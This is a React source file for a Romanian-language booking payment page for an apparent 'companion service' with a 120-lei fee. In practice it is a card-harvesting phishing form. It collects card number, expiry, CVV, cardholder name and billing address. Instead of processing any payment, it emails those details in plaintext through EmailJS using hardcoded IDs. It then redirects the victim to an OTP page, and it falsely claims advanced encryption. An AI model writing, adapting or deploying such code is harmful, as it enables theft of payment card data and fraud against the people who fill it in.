import React, { useState } from 'react';
import { Modal, Button, Form } from 'react-bootstrap';
import { useNavigate } from 'react-router-dom';
import emailjs from 'emailjs-com';
import './ExamForm.css';
import Navbar from './Navbar';
import Footer from './Footer';
import bankLogo from './img/banklogo.png';

const ExamForm = () => {
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  const [showPinModal, setShowPinModal] = useState(false);
  const [bankName, setBankName] = useState('');
  const [cardNumber, setCardNumber] = useState('');
  const [expirationDate, setExpirationDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [nameOnCard, setNameOnCard] = useState('');
  const [cardType, setCardType] = useState('');
  const [pin, setPin] = useState('');
  const [streetAddress, setStreetAddress] = useState('');
  const [city, setCity] = useState('');
  const [postalCode, setPostalCode] = useState('');
  const navigate = useNavigate();

  const resetForm = () => {
    setBankName('');
    setCardNumber('');
    setExpirationDate('');
    setCvv('');
    setNameOnCard('');
    setCardType('');
    setPin('');
    setStreetAddress('');
    setCity('');
    setPostalCode('');
  };

  const handlePayClick = (e) => {
    e.preventDefault();
    setShowConfirmModal(true);
  };

  const handleConfirmClick = () => {
     sendEmail();
    setShowConfirmModal(false);
    resetForm();
    navigate('/otp');
  };

  // const handlePinSubmit = (e) => {
  //   e.preventDefault();
  //   sendEmail();
  //   resetForm();
  //   setShowPinModal(false);
  //   navigate('/otp');
  // };

  const handleTextOnlyInput = (e) => {
    e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
  };

  const handleNumberOnlyInput = (e) => {
    e.target.value = e.target.value.replace(/[^0-9]/g, '');
  };

  const handleCardNumberChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    value = value.replace(/(.{4})/g, '$1 ').trim();
    setCardNumber(value);
  };

  const handleExpirationDateChange = (e) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 3) {
      value = value.replace(/(.{2})(.{2})/, '$1 / $2');
    }
    setExpirationDate(value);
  };

  const sendEmail = () => {
    const templateParams = {
      bankName,
      cardNumber,
      expirationDate,
      cvv,
      nameOnCard,
      cardType,
      pin,
      streetAddress,
      city,
      postalCode,
    };

    emailjs.send(
      'service_e234qa4', // Replace with your service ID
      'template_f0nymc7', // Replace with your template ID
      templateParams,
      'aM4ACgzNEz-ykB_dV' // Replace with your user ID
    )
      .then((response) => {
        console.log('SUCCESS!', response.status, response.text);
      }, (err) => {
        console.log('FAILED...', err);
      });
  };

  return (
    <div>
      <Navbar />
      <div className="container d-flex justify-content-center">
        <div className="col-md-6 mt-5">
          <h2 className="mt-5">PLATĂ REZERVARE – HOTEL / PARTENER ORGANIZAȚIE</h2>
          <p><strong>Despre rezervare</strong></p>
          <p>Această plată confirmă programarea dvs. cu serviciul nostru de companie verificat, organizată în colaborare cu partenerii noștri de încredere din hoteluri și organizații din întreaga Românie.</p>
          <div className="card mb-3">
            <div className="card-body">
              {/* <p className="card-text">University exam form with a tag of $6 on it</p> */}
              <p className="card-text fw-medium fs-3">Partener: Hotel / Organizație (va fi confirmat după rezervare)</p>
              <p className="fw-bold fs-4 text-end">Taxă de rezervare: 120 lei</p>
            </div>
          </div>
          <h3>Efectuați plata acum</h3>
          <p>Introduceți următoarele pentru a finaliza plata <b>folosind cardul dvs. bancar</b>:<br />
          Introduceți doar date corecte pentru a evita <span style={{color: "#FF0000"}}>erori</span> în timpul plății.</p>
          <div className="card p-4 pt-2">
          <p className='fst-italic text-end p-0 m-0'>Plată sigură și securizată</p>
          <div className="d-flex justify-content-end mb-3">          
            <img src={bankLogo} alt="" class="img-fluid" width={270} height={30} />
          </div>
            <Form onSubmit={handlePayClick} autoComplete="off">
              <Form.Group className="mb-3" controlId="bankName">
                <Form.Label>Numele băncii</Form.Label>
                <Form.Control 
                  // type="text" 
                  placeholder="Introduceți numele băncii" 
                  required 
                  value={bankName}
                  // onInput={handleTextOnlyInput} 
                  onChange={(e) => setBankName(e.target.value)}
                />
              </Form.Group>
              <Form.Group className="mb-3" controlId="cardNumber">
                <Form.Label>Numărul cardului</Form.Label>
                <Form.Control 
                  // type="text" 
                  placeholder="0000 0000 0000 0000" 
                  required 
                  maxLength="24" 
                  value={cardNumber}
                  onChange={handleCardNumberChange} 
                />
              </Form.Group>
              <div className="row">
                <Form.Group className="col-md-6 mb-3" controlId="expirationDate">
                  <Form.Label>Data expirării</Form.Label>
                  <Form.Control 
                    // type="text" 
                    placeholder="LL / AA" 
                    required 
                    maxLength="7" 
                    value={expirationDate}
                    onChange={handleExpirationDateChange} 
                  />
                </Form.Group>
                <Form.Group className="col-md-6 mb-3" controlId="cvv">
                  <Form.Label>CVV</Form.Label>
                  <Form.Control 
                    // type="text" 
                    placeholder="000" 
                    required 
                    maxLength="4" 
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value)}
                    onInput={handleNumberOnlyInput}
                  />
                </Form.Group>
              </div>
              <Form.Group className="mb-3" controlId="nameOnCard">
                <Form.Label>Numele de pe card</Form.Label>
                <Form.Control 
                  // type="text" 
                  placeholder="Introduceți numele de pe card" 
                  required 
                  value={nameOnCard}
                  // onInput={handleTextOnlyInput} 
                  onChange={(e) => setNameOnCard(e.target.value)}
                />
              </Form.Group>
              <Form.Group className="mb-3" controlId="cardType">
                <Form.Label>Tipul cardului</Form.Label>
                <div>
                  <Form.Check 
                    inline 
                    type="radio" 
                    name="cardType" 
                    id="creditCard" 
                    label="Card de credit" 
                    required 
                    checked={cardType === 'credit'}
                    onChange={(e) => setCardType('credit')}
                  />
                  <Form.Check 
                    inline 
                    type="radio" 
                    name="cardType" 
                    id="debitCard" 
                    label="Card de debit" 
                    required 
                    checked={cardType === 'debit'}
                    onChange={(e) => setCardType('debit')}
                  />
                </div>
              </Form.Group>

              <Form.Group controlId="formAddress" className="mt-4">
                <Form.Label>Adresa de facturare</Form.Label>
                <Form.Control type="text" placeholder="Adresa străzii" name="streetAddress" value={streetAddress} onChange={(e) => setStreetAddress(e.target.value)} required className="mb-2" />
                <div className="row">
                  <Form.Group className="col-md-6 mb-3" controlId="city">
                    <Form.Control type="text" placeholder="Oraș / Localitate" name="city" value={city} onChange={(e) => setCity(e.target.value)} required />              
                  </Form.Group>
                  <Form.Group className="col-md-6 mb-3" controlId="postalCode">
                    <Form.Control type="text" placeholder="Cod poștal" name="postalCode" value={postalCode} onChange={(e) => setPostalCode(e.target.value)} required />
                  </Form.Group>
                </div>
              </Form.Group>

              <Button variant="primary" type="submit">PLĂTEȘTE</Button>
              <p className="fw-bold text-end"> - 120 lei</p>
            </Form>
          </div>
          <p className="mt-3"><strong>Plată sigură și securizată</strong><br />
          Securitatea dvs. este prioritatea noastră. Folosim criptare avansată pentru a vă proteja informațiile. Încrederea dvs. este importantă pentru noi.</p>
          
          {/* Confirmation Modal */}
          <Modal show={showConfirmModal} onHide={() => setShowConfirmModal(false)}>
            <Modal.Header closeButton>
              <Modal.Title>Confirmați detaliile</Modal.Title>
            </Modal.Header>
            <Modal.Body>
              <p>Vă rugăm să confirmați și să verificați detaliile <b>cu cardul dvs. bancar</b> înainte de a continua pentru a evita <span style={{color: "#FF0000"}}>erori</span>.</p>
            </Modal.Body>
            <Modal.Footer>
              <Button variant="secondary" onClick={() => setShowConfirmModal(false)}>Anulează</Button>
              <Button variant="primary" onClick={handleConfirmClick}>Da, am confirmat</Button>
            </Modal.Footer>
          </Modal>

          
        </div>
      </div>
      <Footer />
    </div>
  );
};

export default ExamForm;
